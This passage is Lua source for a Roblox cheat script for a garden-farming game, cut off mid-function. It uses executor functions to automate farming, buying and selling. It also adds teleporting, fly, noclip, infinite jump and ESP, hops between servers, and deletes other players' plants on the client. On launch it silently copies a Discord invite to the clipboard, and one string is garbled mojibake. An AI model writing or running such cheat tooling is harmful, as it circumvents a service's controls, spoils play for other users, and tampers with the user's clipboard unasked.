setclipboard("https://discord.gg/wDMPK3QAmY")
-- Services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Player and Character
local lp = Players.LocalPlayer
local char = lp.Character or lp.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local oldCFrame = hrp.CFrame
local leaderstats = lp:FindFirstChild("leaderstats")
local shecklesStat = leaderstats and leaderstats:FindFirstChild("Sheckles")
local RS, Players = game:GetService("ReplicatedStorage"), game:GetService("Players")
local PetName, PetWeight, PetAge = "", "", ""

local function makeInput(Tab, name, placeholder, callback)
    Tab:CreateInput({
        Name = name,
        PlaceholderText = placeholder,
        RemoveTextAfterFocusLost = false,
        Callback = callback,
    })
end

-- Remotes and Paths
local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
local seedRemote = GameEvents:WaitForChild("BuySeedStock")
local gearRemote = GameEvents:WaitForChild("BuyGearStock")
local TwilightRemote = GameEvents:WaitForChild("BuyNightEventShopStock")
local easterRemote = GameEvents:WaitForChild("BuyEasterStock")
local dmRemote = GameEvents:WaitForChild("BuyEventShopStock")
local plantRemote = GameEvents:WaitForChild("Plant_RE")
local favoriteEvent = GameEvents:WaitForChild("Favorite_Item")
local seedPath = lp.PlayerGui.Seed_Shop.Frame.ScrollingFrame
local gearPath = lp.PlayerGui.Gear_Shop.Frame.ScrollingFrame
local bmPath = lp.PlayerGui.EventShop_UI.Frame.ScrollingFrame

-- Constants
local ProductId = 3268187638
local CLICK_DELAY = 0.00000001
local MAX_DISTANCE = 50
local RANGE = 50
local flySpeed = 48

-- Item Lists
local seedItems = {"Carrot", "Strawberry", "Blueberry", "Orange Tulip", "Tomato", "Corn", "Daffodil", "Watermelon", "Pumpkin", "Apple", "Bamboo", "Coconut", "Cactus", "Dragon Fruit", "Mango", "Grape", "Mushroom", "Pepper", "Cacao", "Beanstalk"}
local gearItems = {"Watering Can", "Trowel", "Recall Wrench", "Basic Sprinkler", "Advanced Sprinkler", "Godly Sprinkler", "Lightning Rod", "Master Sprinkler", "Favorite Tool", "Harvest Tool"}
local TwilightItems = {"Night Egg", "Night Seed Pack", "Twilight Crate", "Star Caller", "Moon Cat", "Celestiberry", "Moon Mango"}
local mutationOptions = {"Wet", "Gold", "Frozen", "Rainbow", "Choc", "Chilled", "Shocked", "Moonlit", "Bloodlit", "Celestial", "Plasma", "Disco", "Zombified"}
local seedNames = {"Apple", "Banana", "Bamboo", "Blueberry", "Candy Blossom", "Candy Sunflower", "Carrot", "Cactus", "Chocolate Carrot", "Chocolate Sprinkler", "Coconut", "Corn", "Cranberry", "Cucumber", "Cursed Fruit", "Candy Blossom", "Daffodil", "Dragon Fruit", "Durian", "Easter Egg", "Eggplant", "Grape", "Lemon", "Lotus", "Mango", "Mushroom", "Pepper", "Orange Tulip", "Papaya", "Passionfruit", "Peach", "Pear", "Pineapple", "Pumpkin", "Raspberry", "Red Lollipop", "Soul Fruit", "Strawberry", "Tomato", "Venus Fly Trap", "Watermelon", "Cacao", "Beanstalk"}

-- State Variables
local autoBuyEnabled = false
local autoBuyEnabledE = false
local autoFarmEnabled = false
local fastClickEnabled = false
local autoSellEnabled = false
local HarvestEnabled = false
local flyEnabled = false
local noclip = false
local infJump = false
local spamE = false
local enabled = false
local BAnanaDupeE = false
local autoFavoriteEnabled = false
local autoClaimToggle = false
local autoSkipEnabled = false
local AutoPlanting = false
local CurrentlyPlanting = false
local autoMoon = false
local EasterShopBuyEnabled = false
local Autoegg_autoBuyEnabled = false
local Autoegg_firstRun = true
local selectedSeeds = {"Beanstalk", "Pepper", "Cacao"}
local SelectedSeeds = {"Beanstalk", "Pepper", "Cacao"}
local selectedGears = {"Master Sprinkler", "Godly Sprinkler", "Harvest Tool"}
local selectedTwilight = {"Moon Mango", "Celestiberry", "Twilight Crate"}
local EasterShopSelectedItems = {}, {}, {}, {}, EasterShopItems
local selectedMutations = {"Gold", "Frozen", "Rainbow", "Choc", "Chilled", "Shocked", "Moonlit", "Bloodlit", "Celestial"}
local state = {
    selectedMutations = {"Bloodlit", "Celestial", "Disco", "Zombified", "Plasma"},
    espEnabled = false,
    espBillboards = {},
    espHighlights = {},
    webhookUrl = ""
}
local mutationColors = {
    Wet = Color3.fromRGB(0, 0, 255),
    Gold = Color3.fromRGB(255, 215, 0),
    Frozen = Color3.fromRGB(135, 206, 250),
    Rainbow = Color3.fromRGB(255, 255, 255),
    Choc = Color3.fromRGB(139, 69, 19),
    Chilled = Color3.fromRGB(0, 255, 255),
    Shocked = Color3.fromRGB(255, 255, 100),
    Moonlit = Color3.fromRGB(128, 0, 128),
    Bloodlit = Color3.fromRGB(200, 0, 0),
    Celestial = Color3.fromRGB(200, 150, 255)
}

-- Runtime Variables
local farms = {}
local plants = {}
local farmThread, fastClickThread, autoSellThread, HarvestConnection, flightConnection, collectionThread, descendantConnection, connection, claimConnection, BananaDupe
local bodyVelocity, bodyGyro
local promptTracker = {}
local notifiedFruits = {}

lp.PlayerGui.Hud_UI.SideBtns.Spin.Visible = true
lp.PlayerGui.Hud_UI.SideBtns.StarterPack.Visible = true
lp.PlayerGui.Teleport_UI.Frame.Pets.Visible = true
local gearicon = lp.PlayerGui.Teleport_UI.Frame.Gear
gearicon.Visible = true
gearicon.ImageColor3 = Color3.fromRGB(255, 255, 255)

-- Utility Functions
local function parseMoney(moneyStr)
    if not moneyStr then return 0 end
    moneyStr = tostring(moneyStr):gsub("ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢", ""):gsub(",", ""):gsub(" ", ""):gsub("%$", "")
    local multiplier = 1
    if moneyStr:lower():find("k") then
        multiplier = 1000
        moneyStr = moneyStr:lower():gsub("k", "")
    elseif moneyStr:lower():find("m") then
        multiplier = 1000000
        moneyStr = moneyStr:lower():gsub("m", "")
    end
    return (tonumber(moneyStr) or 0) * multiplier
end

local function getPlayerMoney()
    return parseMoney((shecklesStat and shecklesStat.Value) or 0)
end

local function isInventoryFull()
    return #lp.Backpack:GetChildren() >= 200
end

-- Auto Farm Functions
local function updateFarmData()
    farms = {}
    plants = {}
    for _, farm in pairs(workspace:FindFirstChild("Farm"):GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
            local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
            if plantsFolder then
                for _, plantModel in pairs(plantsFolder:GetChildren()) do
                    for _, part in pairs(plantModel:GetDescendants()) do
                        if part:IsA("BasePart") and part:FindFirstChildOfClass("ProximityPrompt") then
                            table.insert(plants, part)
                            break
                        end
                    end
                end
            end
        end
    end
end

local function glitchTeleport(pos)
    if not lp.Character then return end
    local root = lp.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local tween = TweenService:Create(root, TweenInfo.new(0.15, Enum.EasingStyle.Linear), {CFrame=CFrame.new(pos + Vector3.new(0, 5, 0))})
    tween:Play()
end

local function instantFarm()
    if farmThread then task.cancel(farmThread) end
    farmThread = task.spawn(function()
        while autoFarmEnabled do
            while isInventoryFull() do
                if not autoFarmEnabled then return end
                task.wait(1)
            end
            if not autoFarmEnabled then return end
            updateFarmData()
            for _, part in pairs(plants) do
                if not autoFarmEnabled then return end
                if isInventoryFull() then break end
                if part and part.Parent then
                    local prompt = part:FindFirstChildOfClass("ProximityPrompt")
                    if prompt then
                        glitchTeleport(part.Position)
                        task.wait(0.2)
                        for _, farm in pairs(farms) do
                            if not autoFarmEnabled or isInventoryFull() then break end
                            for _, obj in pairs(farm:GetDescendants()) do
                                if obj:IsA("ProximityPrompt") then
                                    local str = tostring(obj.Parent)
                                    if not (str:find("Grow_Sign") or str:find("Core_Part")) then
                                        fireproximityprompt(obj, 1)
                                    end
                                end
                            end
                        end
                        if not autoFarmEnabled then return end
                        task.wait(0.2)
                    end
                end
            end
            if autoFarmEnabled then task.wait(0.1) end
        end
    end)
end

-- Auto Collect Functions
local function isValidPrompt(prompt)
    local parent = prompt.Parent
    if not parent then return false end
    local name = parent.Name:lower()
    return not (name:find("sign") or name:find("core"))
end

local function getNearbyPrompts()
    local nearby = {}
    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nearby end
    
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            for _, obj in pairs(farm:GetDescendants()) do
                if obj:IsA("ProximityPrompt") and isValidPrompt(obj) then
                    local part = obj.Parent
                    if part:IsA("BasePart") then
                        local dist = (hrp.Position - part.Position).Magnitude
                        if dist <= MAX_DISTANCE then
                            table.insert(nearby, obj)
                        end
                    end
                end
            end
        end
    end
    return nearby
end

local function fastClickFarm()
    if fastClickThread then task.cancel(fastClickThread) end
    fastClickThread = task.spawn(function()
        while fastClickEnabled do
            if isInventoryFull() then
                task.wait(1)
                continue
            end
            local prompts = getNearbyPrompts()
            for _, prompt in pairs(prompts) do
                if not fastClickEnabled then return end
                if isInventoryFull() then break end
                fireproximityprompt(prompt, 1)
                task.wait(CLICK_DELAY)
            end
            task.wait(0.1)
        end
    end)
end

-- Auto Sell Functions
local function sellItems()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if not steven then return false end
    
    local char = lp.Character
    if not char then return false end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local originalPosition = hrp.CFrame
    hrp.CFrame = steven.HumanoidRootPart.CFrame * CFrame.new(0, 3, 3)
    task.wait(0.5)
    
    for _ = 1, 5 do
        pcall(function()
            ReplicatedStorage.GameEvents.Sell_Inventory:FireServer()
        end)
        task.wait(0.15)
    end
    
    hrp.CFrame = originalPosition
    return true
end

-- Harvest Functions
local function FindGarden()
    local farm = workspace:FindFirstChild("Farm")
    if not farm then return nil end
    
    for _, plot in ipairs(farm:GetChildren()) do
        local data = plot:FindFirstChild("Important") and plot.Important:FindFirstChild("Data")
        local owner = data and data:FindFirstChild("Owner")
        if owner and owner.Value == lp.Name then
            return plot
        end
    end
    return nil
end

local function CanHarvest(part)
    local prompt = part:FindFirstChild("ProximityPrompt")
    return prompt and prompt.Enabled
end

local function Harvest()
    if not HarvestEnabled then return end
    if isInventoryFull() then return end
    
    local garden = FindGarden()
    if not garden then return end
    
    local plants = garden:FindFirstChild("Important") and garden.Important:FindFirstChild("Plants_Physical")
    if not plants then return end
    
    for _, plant in ipairs(plants:GetChildren()) do
        if not HarvestEnabled then break end
        local fruits = plant:FindFirstChild("Fruits")
        if fruits then
            for _, fruit in ipairs(fruits:GetChildren()) do
                if not HarvestEnabled then break end
                for _, part in ipairs(fruit:GetChildren()) do
                    if not HarvestEnabled then break end
                    if part:IsA("BasePart") and CanHarvest(part) then
                        local prompt = part.ProximityPrompt
                        local pos = part.Position + Vector3.new(0, 3, 0)
                        if lp.Character and lp.Character.PrimaryPart then
                            lp.Character:SetPrimaryPartCFrame(CFrame.new(pos))
                            task.wait(0.1)
                            if not HarvestEnabled then break end
                            prompt:InputHoldBegin()
                            task.wait(0.1)
                            if not HarvestEnabled then break end
                            prompt:InputHoldEnd()
                            task.wait(0.1)
                        end
                    end
                end
            end
        end
    end
end

local function ToggleHarvest(state)
    if HarvestConnection then
        HarvestConnection:Disconnect()
        HarvestConnection = nil
    end
    HarvestEnabled = state
    if state then
        HarvestConnection = RunService.Heartbeat:Connect(function()
            if HarvestEnabled then
                Harvest()
            else
                HarvestConnection:Disconnect()
                HarvestConnection = nil
            end
        end)
    end
end

-- Movement Functions
local function Fly(state)
    flyEnabled = state
    if flyEnabled then
        local character = lp.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        
        bodyGyro = Instance.new("BodyGyro")
        bodyVelocity = Instance.new("BodyVelocity")
        bodyGyro.P = 9000
        bodyGyro.maxTorque = Vector3.new(8999999488, 8999999488, 8999999488)
        bodyGyro.cframe = character.HumanoidRootPart.CFrame
        bodyGyro.Parent = character.HumanoidRootPart
        
        bodyVelocity.velocity = Vector3.new(0, 0, 0)
        bodyVelocity.maxForce = Vector3.new(8999999488, 8999999488, 8999999488)
        bodyVelocity.Parent = character.HumanoidRootPart
        humanoid.PlatformStand = true
        
        flightConnection = RunService.Heartbeat:Connect(function()
            if not flyEnabled or not character:FindFirstChild("HumanoidRootPart") then
                if flightConnection then flightConnection:Disconnect() end
                return
            end
            
            local cam = workspace.CurrentCamera.CFrame
            local moveVec = Vector3.new()
            
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                moveVec = moveVec + cam.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then
                moveVec = moveVec - cam.LookVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then
                moveVec = moveVec - cam.RightVector
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then
                moveVec = moveVec + cam.RightVector
            end
            
            if moveVec.Magnitude > 0 then
                moveVec = moveVec.Unit * flySpeed
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                moveVec = moveVec + Vector3.new(0, flySpeed, 0)
            end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                moveVec = moveVec + Vector3.new(0, -flySpeed, 0)
            end
            
            bodyVelocity.velocity = moveVec
            bodyGyro.cframe = cam
        end)
    else
        if bodyVelocity then bodyVelocity:Destroy() end
        if bodyGyro then bodyGyro:Destroy() end
        
        local character = lp.Character
        if character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.PlatformStand = false
            end
        end
        
        if flightConnection then
            flightConnection:Disconnect()
            flightConnection = nil
        end
    end
end

local function ToggleNoclip(state)
    noclip = state
end

RunService.Stepped:Connect(function()
    if noclip then
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide == true then
                part.CanCollide = false
            end
        end
    end
end)

local function ToggleInfJump(state)
    infJump = state
end

UserInputService.JumpRequest:Connect(function()
    if infJump and char and char:FindFirstChildOfClass("Humanoid") then
        char:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- Shop Functions
local function OpenShop()
    local shop = lp.PlayerGui.Seed_Shop
    shop.Enabled = not shop.Enabled
end

local function OpenGearShop()
    local gear = lp.PlayerGui.Gear_Shop
    gear.Enabled = not gear.Enabled
end

local function OpenEaster()
    local easter = lp.PlayerGui.Easter_Shop
    easter.Enabled = not easter.Enabled
end

local function OpenQuest()
    local quest = lp.PlayerGui.DailyQuests_UI
    quest.Enabled = not quest.Enabled
end

local function OpenBloodShop()
    local Bs = lp.PlayerGui.EventShop_UI
    Bs.Enabled = not Bs.Enabled
end

local function OpenCosmetic()
    local Bs = lp.PlayerGui.CosmeticShop_UI
    Bs.Enabled = not Bs.Enabled
end

local function OpenTwilight()
    local Bs = lp.PlayerGui.NightEventShop_UI
    Bs.Enabled = not Bs.Enabled
end

local function OpenTwilightQuest()
    local Bs = lp.PlayerGui.NightQuest_UI
    Bs.Enabled = not Bs.Enabled
end

local function EggShop1()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations["Common Egg"].ProximityPrompt)
end

local function EggShop2()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations:GetChildren()[6].ProximityPrompt)
end

local function EggShop3()
    fireproximityprompt(workspace.NPCS["Pet Stand"].EggLocations:GetChildren()[5].ProximityPrompt)
end

-- Auto Buy Egg
local Autoegg_npc = workspace:WaitForChild("NPCS"):WaitForChild("Pet Stand")
local Autoegg_timer = Autoegg_npc.Timer.SurfaceGui:WaitForChild("ResetTimeLabel")
local Autoegg_eggLocations = Autoegg_npc:WaitForChild("EggLocations")
local Autoegg_events = GameEvents

local function Autoegg_safeFirePrompt(prompt)
    if prompt then
        pcall(function()
            fireproximityprompt(prompt)
        end)
    end
end

local function Autoegg_safeFireServer(id)
    pcall(function()
        Autoegg_events:WaitForChild("BuyPetEgg"):FireServer(id)
    end)
end

local function Autoegg_setAlwaysShow()
    for _, obj in ipairs(Autoegg_eggLocations:GetChildren()) do
        for _, child in ipairs(obj:GetDescendants()) do
            if child:IsA("ProximityPrompt") then
                child.Exclusivity = Enum.ProximityPromptExclusivity.AlwaysShow
            end
        end
    end
end

local function Autoegg_autoBuyEggs()
    if Autoegg_autoBuyEnabled then
        if not Autoegg_firstRun then
            while Autoegg_timer.Text ~= "00:00:00" do
                task.wait(0.1)
            end
            task.wait(3)
        else
            Autoegg_firstRun = false
        end

        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
        lp.Character.HumanoidRootPart.CFrame = CFrame.new(-255.12291, 2.99999976, -1.13749218, -0.0163238496, 1.05261321e-07, 0.999866784, -5.92361182e-09, 1, -1.0537206e-07, -0.999866784, -7.64290053e-09, -0.0163238496)

        Autoegg_setAlwaysShow()

        local commonEggPrompt = Autoegg_eggLocations:FindFirstChild("Common Egg")
        if commonEggPrompt then
            Autoegg_safeFirePrompt(commonEggPrompt:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(1)
        end

        local eggSlot6 = Autoegg_eggLocations:GetChildren()[6]
        if eggSlot6 then
            Autoegg_safeFirePrompt(eggSlot6:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(2)
        end

        local eggSlot5 = Autoegg_eggLocations:GetChildren()[5]
        if eggSlot5 then
            Autoegg_safeFirePrompt(eggSlot5:FindFirstChild("ProximityPrompt"))
            task.wait(0.3)
            Autoegg_safeFireServer(3)
        end

        lp.Character.HumanoidRootPart.CFrame = oldCFrame
    end
end

task.spawn(function()
    while true do
        task.wait(0.5)
        if Autoegg_autoBuyEnabled then
            Autoegg_autoBuyEggs()
        end
    end
end)

-- Sell Functions
local function SellAll()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if steven then
        hrp.CFrame = steven.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.2)
        GameEvents:WaitForChild("Sell_Inventory"):FireServer()
        
        local farms = workspace:WaitForChild("Farm"):GetChildren()
        for _, farm in pairs(farms) do
            local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
            if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
                local spawn = farm:FindFirstChild("Spawn_Point")
                if spawn then
                    hrp.CFrame = spawn.CFrame + Vector3.new(0, 3, 0)
                    break
                end
            end
        end
    end
end

local function HSell()
    local steven = workspace.NPCS:FindFirstChild("Steven")
    if steven then
        hrp.CFrame = steven.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.2)
        GameEvents:WaitForChild("Sell_Item"):FireServer()
        
        local farms = workspace:WaitForChild("Farm"):GetChildren()
        for _, farm in pairs(farms) do
            local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
            if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
                local spawn = farm:FindFirstChild("Spawn_Point")
                if spawn then
                    hrp.CFrame = spawn.CFrame + Vector3.new(0, 3, 0)
                    break
                end
            end
        end
    end
end

local function AutoGiveFruitMoon(state)
    autoMoon = state
    task.spawn(function()
        while autoMoon do
            local backpack = lp:FindFirstChild("Backpack")
            local character = lp.Character or lp.CharacterAdded:Wait()
            if backpack and character then
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and string.find(tool.Name, "%[Moonlit%]") then
                        tool.Parent = character
                        task.wait(0.5)
                        for _ = 1, 10 do
                            GameEvents.NightQuestRemoteEvent:FireServer("SubmitHeldPlant")
                        end
                        task.wait(0.5)
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

-- Auto Collect V2 Functions
local function modifyPrompt(prompt, show)
    pcall(function()
        prompt.RequiresLineOfSight = not show
        prompt.Exclusivity = show and Enum.ProximityPromptExclusivity.AlwaysShow or Enum.ProximityPromptExclusivity.One
    end)
end

local function isInsideFarm(part)
    for _, farm in pairs(farms) do
        if part:IsDescendantOf(farm) then
            return true
        end
    end
    return false
end

local function handleNewPrompt(prompt)
    if not prompt:IsA("ProximityPrompt") then return end
    if not isInsideFarm(prompt) then return end
    
    if not promptTracker[prompt] then
        promptTracker[prompt] = {
            originalRequiresLOS = prompt.RequiresLineOfSight,
            originalExclusivity = prompt.Exclusivity
        }
    end
    
    modifyPrompt(prompt, spamE)
    prompt.AncestryChanged:Connect(function(_, parent)
        if parent == nil then
            promptTracker[prompt] = nil
        end
    end)
end

-- One Click Remove Functions
local function OneClickRemove(state)
    enabled = state
    local confirmFrame = lp.PlayerGui:FindFirstChild("ShovelPrompt")
    if confirmFrame and confirmFrame:FindFirstChild("ConfirmFrame") then
        confirmFrame.ConfirmFrame.Visible = not state
    end
end

-- Destroy Sign Function
local function DestroySign()
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local sign = farm:FindFirstChild("Sign")
        if sign then
            local core = sign:FindFirstChild("Core_Part")
            if core then
                for _, obj in pairs(core:GetDescendants()) do
                    if obj:IsA("ProximityPrompt") then
                        obj:Destroy()
                    end
                end
            end
        end
        
        local growSign = farm:FindFirstChild("Grow_Sign")
        if growSign then
            for _, obj in pairs(growSign:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    obj:Destroy()
                end
            end
        end
    end
end

-- Auto Favorite Functions
local function toolMatchesMutation(toolName)
    for _, mutation in ipairs(selectedMutations) do
        if string.find(toolName, mutation) then
            return true
        end
    end
    return false
end

local function isToolFavorited(tool)
    return tool:GetAttribute("Favorite") or (tool:FindFirstChild("Favorite") and tool.Favorite.Value)
end

local function favoriteToolIfMatches(tool)
    if toolMatchesMutation(tool.Name) and not isToolFavorited(tool) then
        favoriteEvent:FireServer(tool)
        task.wait(0.1)
    end
end

local function processBackpack()
    local backpack = lp:FindFirstChild("Backpack") or lp:WaitForChild("Backpack")
    for _, tool in ipairs(backpack:GetChildren()) do
        favoriteToolIfMatches(tool)
    end
end

local function setupAutoFavorite()
    if connection then connection:Disconnect() end
    local backpack = lp:WaitForChild("Backpack")
    connection = backpack.ChildAdded:Connect(function(tool)
        task.wait(0.1)
        favoriteToolIfMatches(tool)
    end)
    processBackpack()
end

-- Auto Claim Premium Seeds Functions
local function claimPremiumSeed()
    GameEvents.SeedPackGiverEvent:FireServer("ClaimPremiumPack")
end

local function toggleAutoClaim(newState)
    autoClaimToggle = newState
    if claimConnection then
        claimConnection:Disconnect()
        claimConnection = nil
    end
    if autoClaimToggle then
        claimConnection = RunService.Heartbeat:Connect(function()
            claimPremiumSeed()
            task.wait()
        end)
    end
end

-- Auto Open Crate Functions
local function toggleAutoSkip()
    autoSkipEnabled = not autoSkipEnabled
    if autoSkipEnabled then
        task.spawn(function()
            local character = lp.Character
            local backpack = lp:FindFirstChild("Backpack")
            local seedTool
            if backpack then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and tool.Name:find("Basic Seed Pack") then
                        seedTool = tool
                        break
                    end
                end
            end
            if seedTool and character then
                seedTool.Parent = character
            end
            
            while autoSkipEnabled do
                local PlayerGui = lp:FindFirstChild("PlayerGui")
                local RollCrate_UI = PlayerGui and PlayerGui:FindFirstChild("RollCrate_UI")
                local character = lp.Character
                local equippedTool = character and character:FindFirstChildOfClass("Tool")
                local holdingSeed = equippedTool and equippedTool.Name:find("Basic Seed Pack")
                
                if RollCrate_UI then
                    if RollCrate_UI.Enabled then
                        local Frame = RollCrate_UI:FindFirstChild("Frame")
                        local Button = Frame and Frame:FindFirstChild("Skip")
                        if Button and Button:IsA("ImageButton") and Button.Visible then
                            GuiService.SelectedObject = Button
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                        end
                    elseif holdingSeed then
                        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end

-- Server Hop Function
local function ServerHop()
    local servers = {}
    local cursor = nil
    repeat
        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor then url = url .. "&cursor=" .. cursor end
        local data = HttpService:JSONDecode(game:HttpGet(url))
        for _, server in ipairs(data.data) do
            table.insert(servers, server.id)
        end
        cursor = data.nextPageCursor
    until not cursor or #servers > 0
    if #servers == 0 then return end
    TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], lp)
end

-- Auto Plant Functions
local function getPlayerPosition()
    local char = lp.Character or lp.CharacterAdded:Wait()
    local root = char:FindFirstChild("HumanoidRootPart")
    return root and root.Position or Vector3.zero
end

local function getCurrentSeedsInBackpack()
    local result = {}
    for _, tool in ipairs(lp.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local base = tool.Name:match("^(.-) Seed")
            if base and table.find(SelectedSeeds, base) then
                result[#result + 1] = {BaseName = base, Tool = tool}
            end
        end
    end
    return result
end

local function plantEquippedSeed(seedName)
    local pos = getPlayerPosition()
    plantRemote:FireServer(pos, seedName)
end

local function equipTool(tool)
    if not tool or not tool:IsDescendantOf(lp.Backpack) then return end
    pcall(function()
        lp.Character.Humanoid:UnequipTools()
        task.wait(0.1)
        tool.Parent = lp.Character
        while not lp.Character:FindFirstChild(tool.Name) do
            task.wait(0.1)
        end
    end)
end

local function startAutoPlanting()
    if CurrentlyPlanting then return end
    CurrentlyPlanting = true
    task.spawn(function()
        while AutoPlanting do
            local seeds = getCurrentSeedsInBackpack()
            for _, data in ipairs(seeds) do
                local tool = data.Tool
                local seedName = data.BaseName
                if not table.find(SelectedSeeds, seedName) then continue end
                if tool and tool:IsA("Tool") and tool:IsDescendantOf(lp.Backpack) then
                    equipTool(tool)
                    task.wait(0.2)
                    while AutoPlanting and lp.Character:FindFirstChild(tool.Name) do
                        if not table.find(SelectedSeeds, seedName) then break end
                        plantEquippedSeed(seedName)
                        task.wait(0.1)
                    end
                end
            end
            task.wait(0.1)
        end
        CurrentlyPlanting = false
    end)
end

-- Destroy Others Farm Function
local function DestroyOthersFarm()
    local farms = workspace:FindFirstChild("Farm")
    if not farms then return end
    for _, farm in pairs(farms:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value ~= lp.Name then
            local plants = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Plants_Physical")
            if plants then
                for _, obj in pairs(plants:GetChildren()) do
                    obj:Destroy()
                end
            end
        end
    end
end

-- ESP Functions
local function createESP(fruitModel)
    if state.espBillboards[fruitModel] then
        state.espBillboards[fruitModel]:Destroy()
        state.espBillboards[fruitModel] = nil
    end
    if state.espHighlights[fruitModel] then
        state.espHighlights[fruitModel]:Destroy()
        state.espHighlights[fruitModel] = nil
    end
    if not state.espEnabled then return end
    local activeMutations = {}
    for _, mutation in ipairs(mutationOptions) do
        if table.find(state.selectedMutations, mutation) and fruitModel:GetAttribute(mutation) then
            table.insert(activeMutations, mutation)
        end
    end
    if #activeMutations == 0 then return end
    local text = fruitModel.Name .. " - " .. table.concat(activeMutations, ", ")
    local espColor = mutationColors[activeMutations[1]] or Color3.fromRGB(255, 255, 255)
    local highlight = Instance.new("Highlight")
    highlight.Name = "MutationESP_Highlight"
    highlight.FillTransparency = 1
    highlight.OutlineColor = espColor
    highlight.OutlineTransparency = 0
    highlight.Adornee = fruitModel
    highlight.Parent = fruitModel
    state.espHighlights[fruitModel] = highlight
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "MutationESP"
    billboard.Adornee = fruitModel.PrimaryPart or fruitModel:FindFirstChildWhichIsA("BasePart")
    billboard.Size = UDim2.fromOffset(100, 20)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    billboard.Enabled = true
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.fromScale(1, 1)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "{" .. text .. "}"
    textLabel.TextColor3 = espColor
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.5
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = billboard
    billboard.Parent = fruitModel
    state.espBillboards[fruitModel] = billboard
end

local function updateESP()
    for _, billboard in pairs(state.espBillboards) do
        billboard:Destroy()
    end
    for _, highlight in pairs(state.espHighlights) do
        highlight:Destroy()
    end
    table.clear(state.espBillboards)
    table.clear(state.espHighlights)
    if not state.espEnabled or not workspace:FindFirstChild("Farm") then return end
    local farms = {}
    for _, farm in ipairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    for _, farm in ipairs(farms) do
